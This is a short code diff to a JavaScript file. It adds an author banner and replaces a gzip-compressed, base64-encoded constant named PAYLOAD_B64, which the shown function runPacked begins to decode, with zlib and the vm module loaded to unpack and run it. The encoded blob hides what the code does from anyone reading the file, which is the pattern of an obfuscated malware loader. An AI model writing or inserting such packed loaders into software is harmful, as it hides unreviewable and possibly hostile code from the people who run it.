@@ -1,7 +1,14 @@
+
+/*
+╔══════════════════════════════════════════════════════════╗
+║        Website : Guildee                                 ║
+║        Autheur : Yusu_sauvage                            ║
+╚══════════════════════════════════════════════════════════╝
+*/
 const zlib = require("zlib");
 const vm = require("vm");
 
-const PAYLOAD_B64 = "H4sIAAAAAAAACnVU3WrbMBS+z1OcGRMc6Ox0hcEavNIf2C462FbKLrpBZFlNtTiSJslNjOsH6nP0xYYk27FS987S93N+fI4wZ0qDWK8gBUn+lVSSKIgTgfAarUj8V3EWzBaTCba8GoSkTF/wHTS+QEmc3JcMa8pZ0pGMshMWHOWXnN3T1ZgUW2TIp4zqq2yMm2eveFRhLvPLghKmRyWOkGDL8ArCkiBNzoUYT0uSBAlxWMg3npcFUW9KNhZ/b6hEDsUu2iVnGlFG5JsGuGPYXCOkKoYhmkH6GeoJgLNzTYN00NtottjDegfpYcTIiYxrx8uzG410qSAFtEVUt63fM3ui6+IYe/gDRkIgIfpUzoWIsN5ZX+cw6GiLGEiIuKBKE9b6xYJLfTRoQl9nhRikEPzeHWd3Jx83wWIAVqQo+HYPn/jwShIyEH/wUUnyPXZ8qERVD36aHwoV0T1qwQHK0IaYdriytiRTVJOz2F4/PZll7L+DXw713B+JVJSbtA21Oxn2PJ7Hc4+LSv3AJaQQGW57mk6HRy+wu5rNrN0tWzO+Za2hV5/gkNoLcFbmRlHNZQXTaQsARLoShN/DASNNUwiUlpStgp4LcHbAG0CnB1BcysIm2XKCB62FOk2SFdUPZRZjvkkqXsrESPzu59k1Zab/3dzHfD3pEliGtR2J5lt18+PaKBjB+uU5rO0vbZaTLp+lucpbHpGSlBJOIax7VyIll00v9HNw+9Im8s5brJgwlBUk93NCVZO/PCuENX0cS8e36CvyanqzmkE9w0r8rEbL6V76qHW66x2XYe12rwlrM2C9FCCszco2j2Hdzu7e9mivv/157TJr6WHdLkyGFLmVxajoO5d6VGQej1HF1QV0Ydxk+KjrwaAdryjnpe461oZ0OzQa7QvVX8tsSDYD+pr6p/swLPtp38tmtpg0M/PI/wfkst01uAcAAA==";
+const PAYLOAD_B64 = "H4sIAAAAAAAACnVU3WrbMBS+z1OcGRNs6Ox0hcEavNIf2C462FbKLrpBZFtNtTiSJslNjGvYc+xm132OvtAeYUiyHSt17yx9P+c7x5IyRqUCvlpCAgL/KonAgRfFHGUrtMTRT8moF84nk8zwauCCUHXGttC4Aimy+LakmSKMxh1JKzthwVB+zugtWY5JM4MM+YQSdZGOcfP0GY/IjIn8vCCYqlGJJcSZYTgNZQIjhU85H48lcIw432/kE8vLAssXJWuDv9ZULIZiW+2cUYUIxeJFg6xjmKwBkhXNIAgheQ/1BMDa2aFBMphtEM53sNpCsl8xsCLt2vHy9EohVUpIAG0QUe3od8yeaKc4xh7+gJESiPM+yinnQaa2xtc6DCbaIhriPCqIVJi2fhFnQh0MhtD3WSEKCXjft4fpzdHbtTcfgBUuCrbZwUcuvBQYD8RvXFTgfIcd7itR1YPvZvtCiVWPGnCAUrTGehy2rQ1OJVH4JDLbDw/6Mvbf3jeLOu73WEjCdGxN7VaaPYtm0czholLdMQEJBJrbrqbT4dIpbLfC0Nhd0xVlG+qmF5gzSMwGWBu9I4liooLptAUAAlVxzG5hj5EkCXhSCUKXXs8FONnjDaDjPSgqRWECthzvTikuj+N4SdRdmUYZW8cVK0WsJW72PL0kVM++O/MRW026AAu/Nseh+VRdfbnUCooz9fTo1+Z3NotJl2eht/KWh4XApYBj8OveFQvBRNML3Qz2rrRBXjmXKsIUpQXO3UyoavKnR4kyRe7H4rgWfUdOTy92M+hn2ImbarSd7pUPWqeb3nHx7++f3+DX9vI1fq1PWK8H8Gt9Z5t7v24P7877YGdy/fWyzdfy/bq9MimS+FoUo6rPTKhxlX4/RiUXZ9AXsifEhe0shnN5xjktlR7dsKq9SaMFPxD1sUwdtj6rz7k/ug/NMp/m2WzC+aQJ9Vv/H4l5ae2/BwAA";
 
 function runPacked() {
   const gz = Buffer.from(PAYLOAD_B64, "base64");
